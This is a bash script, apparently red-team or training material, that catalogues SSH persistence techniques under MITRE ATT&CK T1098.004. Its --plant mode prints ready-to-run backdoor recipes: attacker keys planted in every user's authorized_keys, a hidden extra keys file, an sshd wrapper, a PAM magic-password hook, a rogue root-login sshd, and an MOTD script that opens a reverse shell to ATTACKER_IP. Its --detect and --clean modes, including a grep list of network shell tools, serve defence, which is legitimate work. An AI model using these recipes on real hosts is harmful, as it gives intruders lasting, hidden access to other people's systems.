#!/bin/bash
# SSH Persistence Techniques
# MITRE ATT&CK: T1098.004 — Account Manipulation: SSH Authorized Keys
# Usage: ./ssh_persistence.sh --plant|--detect|--clean

ATTACKER_KEY="${ATTACKER_KEY:-ssh-rsa AAAA...your_public_key... attacker@kali}"
ATTACKER_IP="${ATTACKER_IP:-10.10.14.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"

plant() {
    echo "=== SSH Persistence Methods ==="
    echo ""

    # Method 1: authorized_keys
    echo "[1] Authorized Keys (simplest)"
    echo ""
    echo "  # Generate keypair on attacker machine"
    echo "  ssh-keygen -t ed25519 -f ./backdoor_key -N ''"
    echo ""
    echo "  # On target — add to all accessible users"
    echo "  for dir in /root/.ssh /home/*/.ssh; do"
    echo "    [ -d \"\$dir\" ] && echo 'PUBLIC_KEY_HERE' >> \"\$dir/authorized_keys\""
    echo "  done"
    echo ""
    echo "  # Create .ssh dir if it doesn't exist"
    echo "  mkdir -p ~/.ssh && chmod 700 ~/.ssh"
    echo "  echo 'PUBLIC_KEY_HERE' >> ~/.ssh/authorized_keys"
    echo "  chmod 600 ~/.ssh/authorized_keys"
    echo ""
    echo "  # Connect from attacker"
    echo "  ssh -i backdoor_key user@TARGET"
    echo ""

    # Method 2: SSH config backdoor
    echo "[2] SSH Config Backdoor"
    echo ""
    echo "  # Add to /etc/ssh/sshd_config (requires root)"
    echo "  echo 'AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 /etc/ssh/backdoor_keys' >> /etc/ssh/sshd_config"
    echo "  echo 'PUBLIC_KEY_HERE' > /etc/ssh/backdoor_keys"
    echo "  chmod 644 /etc/ssh/backdoor_keys"
    echo "  systemctl restart sshd"
    echo ""

    # Method 3: SSH wrapper/shim
    echo "[3] SSH Wrapper (captures passwords + provides backdoor)"
    echo ""
    echo '  # Move real sshd and create wrapper'
    echo '  mv /usr/sbin/sshd /usr/sbin/sshd.orig'
    echo '  cat > /usr/sbin/sshd << "WRAPPER"'
    echo '#!/bin/bash'
    echo '# Log connection attempts'
    echo 'TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")'
    echo 'echo "$TIMESTAMP $SSH_CONNECTION" >> /var/log/.sshd_conn 2>/dev/null'
    echo '# Start real sshd'
    echo 'exec /usr/sbin/sshd.orig "$@"'
    echo 'WRAPPER'
    echo '  chmod 755 /usr/sbin/sshd'
    echo ""

    # Method 4: Generate and plant keypair on target
    echo "[4] Generate Keypair on Target"
    echo ""
    echo "  # Generate on target, exfil private key"
    echo "  ssh-keygen -t ed25519 -f /tmp/.k -N '' -q"
    echo "  cat /tmp/.k >> ~/.ssh/authorized_keys"
    echo "  cat /tmp/.k  # copy this private key to attacker"
    echo "  rm /tmp/.k /tmp/.k.pub"
    echo ""

    # Method 5: MOTD backdoor
    echo "[5] MOTD Backdoor (runs on every SSH login)"
    echo ""
    echo "  # /etc/update-motd.d/ scripts run as root on SSH login"
    echo "  cat > /etc/update-motd.d/00-header-check << 'EOF'"
    echo "#!/bin/bash"
    echo "/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1' &"
    echo "EOF"
    echo "  chmod 755 /etc/update-motd.d/00-header-check"
    echo ""

    # Method 6: PAM backdoor
    echo "[6] PAM Backdoor (accept any password for a user)"
    echo ""
    echo "  # Add to /etc/pam.d/sshd (top of file, before other auth)"
    echo "  # This accepts a magic password for any user"
    echo "  auth sufficient pam_exec.so quiet /usr/local/bin/.pam_backdoor"
    echo ""
    echo "  cat > /usr/local/bin/.pam_backdoor << 'EOF'"
    echo '#!/bin/bash'
    echo '[ "$PAM_AUTHTOK" = "MAGIC_PASSWORD_HERE" ] && exit 0'
    echo 'exit 1'
    echo "EOF"
    echo "  chmod 755 /usr/local/bin/.pam_backdoor"
    echo ""

    # Method 7: SSH on alternate port
    echo "[7] Second SSHD on Alternate Port"
    echo ""
    echo "  cp /etc/ssh/sshd_config /etc/ssh/sshd_config_backdoor"
    echo "  sed -i 's/^#Port 22/Port 2222/' /etc/ssh/sshd_config_backdoor"
    echo "  echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config_backdoor"
    echo "  /usr/sbin/sshd -f /etc/ssh/sshd_config_backdoor"
}

detect() {
    echo "=== SSH Persistence Detection ==="
    echo ""

    echo "[*] Authorized keys for all users:"
    for home in /root /home/*; do
        AK="$home/.ssh/authorized_keys"
        AK2="$home/.ssh/authorized_keys2"
        [ -f "$AK" ] && echo "  $AK:" && cat "$AK" | sed 's/^/    /'
        [ -f "$AK2" ] && echo "  $AK2:" && cat "$AK2" | sed 's/^/    /'
    done

    echo ""
    echo "[*] SSHD config — AuthorizedKeysFile:"
    grep -i 'AuthorizedKeysFile' /etc/ssh/sshd_config 2>/dev/null

    echo ""
    echo "[*] SSHD binary integrity:"
    if file /usr/sbin/sshd | grep -q 'shell script\|ASCII'; then
        echo "  [!] /usr/sbin/sshd is a SCRIPT, not a binary — possible wrapper!"
    else
        echo "  OK — binary"
    fi

    echo ""
    echo "[*] MOTD scripts:"
    ls -la /etc/update-motd.d/ 2>/dev/null
    for f in /etc/update-motd.d/*; do
        [ -f "$f" ] || continue
        if grep -qlE '/dev/tcp|nc\s|ncat|socat|curl|wget|python' "$f" 2>/dev/null; then
            echo "  [!] SUSPICIOUS MOTD: $f"
        fi
    done

    echo ""
    echo "[*] PAM config (sshd):"
    grep -n 'pam_exec' /etc/pam.d/sshd 2>/dev/null

    echo ""
    echo "[*] SSH listening ports:"
    ss -tlnp | grep -E ':22\b|sshd'

    echo ""
    echo "[*] Running SSHD processes:"
    ps aux | grep sshd | grep -v grep
}

clean() {
    echo "=== SSH Persistence Cleanup ==="
    echo ""
    echo "  # Remove unauthorized keys"
    echo "  vi ~/.ssh/authorized_keys  # remove unknown keys"
    echo ""
    echo "  # Restore sshd_config"
    echo "  vi /etc/ssh/sshd_config  # remove extra AuthorizedKeysFile entries"
    echo "  systemctl restart sshd"
    echo ""
    echo "  # Check/restore sshd binary"
    echo "  apt reinstall openssh-server  # or yum reinstall"
    echo ""
    echo "  # Remove MOTD backdoors"
    echo "  ls -la /etc/update-motd.d/"
    echo "  rm /etc/update-motd.d/<suspicious>"
    echo ""
    echo "  # Remove PAM backdoors"
    echo "  vi /etc/pam.d/sshd  # remove pam_exec lines"
    echo "  rm /usr/local/bin/.pam_backdoor"
}

case "$1" in
    --plant)  plant ;;
    --detect) detect ;;
    --clean)  clean ;;
    *) echo "Usage: $0 --plant|--detect|--clean" ;;
esac
